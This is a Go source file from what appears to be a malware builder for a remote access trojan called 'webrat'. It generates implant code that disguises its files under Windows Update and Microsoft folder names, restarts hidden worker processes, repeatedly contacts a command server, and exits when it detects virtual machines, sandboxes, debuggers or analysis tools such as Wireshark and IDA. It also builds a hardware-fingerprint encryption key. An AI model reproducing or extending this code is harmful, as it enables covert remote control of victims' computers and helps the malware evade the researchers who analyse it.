package buildergen

import (
	"fmt"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

func templateMisc(cfg Config) string {
	delay := cfg.StartupDelaySeconds
	if delay < 0 {
		delay = 0
	}
	if delay > 10 {
		delay = 10
	}
	buildID := escapeGoString(strings.TrimSpace(cfg.BuildID))

	return strings.TrimSpace(fmt.Sprintf(`
var startupDelaySeconds = %d
var startupDelayOnce sync.Once

func applyStartupDelay() {
	startupDelayOnce.Do(func() {
		delay := startupDelaySeconds
		if delay < 0 {
			delay = 0
		}
		time.Sleep(time.Duration(delay) * time.Second)
	})
}

func getBuildLockPath() string {
	if "%s" == "" {
		return ""
	}
	dir := filepath.Join(os.Getenv(getProgramDataEnvName()), getWindowsUpdateDirName())
	return filepath.Join(dir, fmt.Sprintf("webrat_%s.lock", "%s"))
}

func ensureSingleRunPerBuild() bool {
	lockPath := getBuildLockPath()
	if lockPath == "" {
		return true
	}

	if _, err := os.Stat(lockPath); err == nil {
		return false
	}

	if err := os.MkdirAll(filepath.Dir(lockPath), 0755); err != nil {
		return false
	}

	f, err := os.OpenFile(lockPath, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return false
	}
	_ = f.Close()
	return true
}

func shouldEnforceBuildLock() bool {
	exePath, err := os.Executable()
	if err != nil {
		return true
	}

	exePathLower := strings.ToLower(filepath.Clean(exePath))

	svcDir := strings.ToLower(filepath.Clean(filepath.Join(os.Getenv(getProgramDataEnvName()), getWindowsUpdateDirName())))
	workerDir := strings.ToLower(filepath.Clean(filepath.Join(os.Getenv(getAppDataEnvName()), getMicrosoftDirName(), getWindowsDirName())))

	sep := string(os.PathSeparator)
	if strings.HasPrefix(exePathLower, svcDir+sep) || strings.HasPrefix(exePathLower, workerDir+sep) {
		return false
	}
	return true
}

func loopA() {
	mutex, err := acquireMutex(getMutexName())
	if err != nil {
		return
	}
	defer windows.CloseHandle(mutex)

	_ = setupLogger()

	rand.Seed(time.Now().UnixNano())

	var chromePid int
	var updatePid int

	go func() {
		for {
			time.Sleep(5 * time.Second)
			if !isProcessRunning(chromePid) {
				chromePid = startWorker(getWorkerExeName())
			}
			if !isProcessRunning(updatePid) {
				updatePid = startWorker(getServiceExeName())
			}
		}
	}()

	for {
		connectToServer()
		time.Sleep(5 * time.Second)
	}
}

func startWorker(exeName string) int {
	cmd := exec.Command(exeName)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := cmd.Start(); err != nil {
		return 0
	}
	return cmd.Process.Pid
}

func acquireMutex(name string) (windows.Handle, error) {
	namePtr, _ := syscall.UTF16PtrFromString(name)
	h, err := windows.CreateMutex(nil, true, namePtr)
	if err != nil {
		if errno, ok := err.(syscall.Errno); !ok || errno != 0 {
			return 0, err
		}
	}
	if windows.GetLastError() == windows.ERROR_ALREADY_EXISTS {
		if h != 0 {
			_ = windows.CloseHandle(h)
		}
		return 0, fmt.Errorf("already running")
	}
	return h, nil
}

func checkAntiMitm() {
	if runtime.GOOS != "windows" {
		return
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: false,
				VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
					if len(rawCerts) == 0 {
						os.Exit(1)
					}

					cert, err := x509.ParseCertificate(rawCerts[0])
					if err != nil {
						os.Exit(1)
					}

					opts := x509.VerifyOptions{
						DNSName: getServerHost(),
						Roots:   nil,
					}

					_, err = cert.Verify(opts)
					if err != nil {
						os.Exit(1)
					}

					return nil
				},
			},
		},
	}

	url := getWsScheme() + "://" + getServerHost() + getWsPath()
	resp, err := client.Get(url)
	if err != nil {
		os.Exit(1)
	}
	resp.Body.Close()

	if resp.TLS == nil || len(resp.TLS.PeerCertificates) == 0 {
		os.Exit(1)
	}
}

func checkAntiVps() {
	if runtime.GOOS != "windows" {
		return
	}

	vboxFiles := []string{
		"C:\\Windows\\System32\\VBox*.dll",
		"C:\\Windows\\System32\\VBoxHook.dll",
		"C:\\Windows\\System32\\VBoxGuest.sys",
		"C:\\Windows\\System32\\VBoxMouse.sys",
		"C:\\Windows\\System32\\VBoxSF.sys",
	}
	for _, file := range vboxFiles {
		if checkFileExists(file) {
			os.Exit(1)
		}
	}

	vmwareFiles := []string{
		"C:\\Windows\\System32\\vmware-vmx.exe",
		"C:\\Windows\\System32\\vmware-vmx-stats.exe",
		"C:\\Windows\\System32\\vmware-vmx-debug.exe",
	}
	for _, file := range vmwareFiles {
		if checkFileExists(file) {
			os.Exit(1)
		}
	}

	vmProcesses := []string{
		"VBoxTray.exe",
		"VBoxService.exe",
		"vmtoolsd.exe",
		"VMwareTray.exe",
		"VMwareUser.exe",
		"prl_tools.exe",
		"prl_cc.exe",
	}
	for _, proc := range vmProcesses {
		if checkProcessRunning(proc) {
			os.Exit(1)
		}
	}

	sandboxProcesses := []string{
		"SandboxieRpcSs.exe",
		"SandboxieDcomLaunch.exe",
		"SbieSvc.exe",
		"procmon.exe",
		"procmon64.exe",
		"wireshark.exe",
		"fiddler.exe",
		"ollydbg.exe",
		"idaq.exe",
		"idaq64.exe",
		"x64dbg.exe",
		"x32dbg.exe",
		"windbg.exe",
	}
	for _, proc := range sandboxProcesses {
		if checkProcessRunning(proc) {
			os.Exit(1)
		}
	}

	if runtime.NumCPU() < 2 {
		os.Exit(1)
	}

	if getSystemMemoryMB() < 2048 {
		os.Exit(1)
	}
}

func checkRegKey(key string) bool {
	return false
}

func checkFileExists(pattern string) bool {
	matches, err := filepath.Glob(pattern)
	return err == nil && len(matches) > 0
}

func checkBiosManufacturer() bool {
	return false
}

func checkProcessRunning(processName string) bool {
	cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", processName), "/NH")
	output, err := cmd.Output()
	if err != nil {
		return false
	}
	return strings.Contains(string(output), processName)
}

func getSystemMemoryMB() int {
	return 4096
}

func getHardwareKey() string {
	var parts []string
	
	if cpu, err := getCpuId(); err == nil && cpu != "" {
		parts = append(parts, cpu)
	}
	
	if disk, err := getDiskSerial(); err == nil && disk != "" {
		parts = append(parts, disk)
	}
	
	if mac, err := getMacAddress(); err == nil && mac != "" {
		parts = append(parts, mac)
	}
	
	key := strings.Join(parts, "")
	if len(key) < 32 {
		key += strings.Repeat("0", 32-len(key))
	}
	return key[:32]
}

func getCpuId() (string, error) {
	cmd := exec.Command("wmic", "cpu", "get", "ProcessorId", "/value")
	output, err := cmd.Output()
	if err != nil {
		return "", err
	}
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "ProcessorId=") {
			return strings.TrimSpace(strings.Split(line, "=")[1]), nil
		}
	}
	return "", fmt.Errorf("cpu id not found")
}

func getDiskSerial() (string, error) {
	cmd := exec.Command("wmic", "diskdrive", "get", "SerialNumber", "/value")
	output, err := cmd.Output()
	if err != nil {
		return "", err
	}
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "SerialNumber=") {
			return strings.TrimSpace(strings.Split(line, "=")[1]), nil
		}
	}
	return "", fmt.Errorf("disk serial not found")
}

func getMacAddress() (string, error) {
	cmd := exec.Command("getmac", "/nh", "/fo", "csv")
	output, err := cmd.Output()
	if err != nil {
		return "", err
	}
	lines := strings.Split(string(output), "\n")
	if len(lines) > 0 {
		parts := strings.Split(lines[0], ",")
		if len(parts) >= 1 {
			return strings.TrimSpace(strings.Trim(parts[0], "\"")), nil
		}
	}
	return "", fmt.Errorf("mac not found")
}

func aesEncrypt(plaintext, key string) string {
	if plaintext == "" || key == "" {
		return ""
	}
	block, err := aes.NewCipher([]byte(key[:32]))
	if err != nil {
		return xorWithKey(plaintext, key)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return xorWithKey(plaintext, key)
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return xorWithKey(plaintext, key)
	}
	ciphertext := gcm.Seal(nonce, nonce, []byte(plaintext), nil)
	return base64.StdEncoding.EncodeToString(ciphertext)
}

func aesDecrypt(encrypted, key string) string {
	if encrypted == "" || key == "" {
		return ""
	}
	data, err := base64.StdEncoding.DecodeString(encrypted)
	if err != nil {
		return xorWithKey(encrypted, key)
	}
	block, err := aes.NewCipher([]byte(key[:32]))
	if err != nil {
		return xorWithKey(encrypted, key)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return xorWithKey(encrypted, key)
	}
	if len(data) < gcm.NonceSize() {
		return xorWithKey(encrypted, key)
	}
	nonce := data[:gcm.NonceSize()]
	ciphertext := data[gcm.NonceSize():]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return xorWithKey(encrypted, key)
	}
	return string(plaintext)
}

func setupLogger() *os.File { return nil }
`, delay, buildID, buildID))
}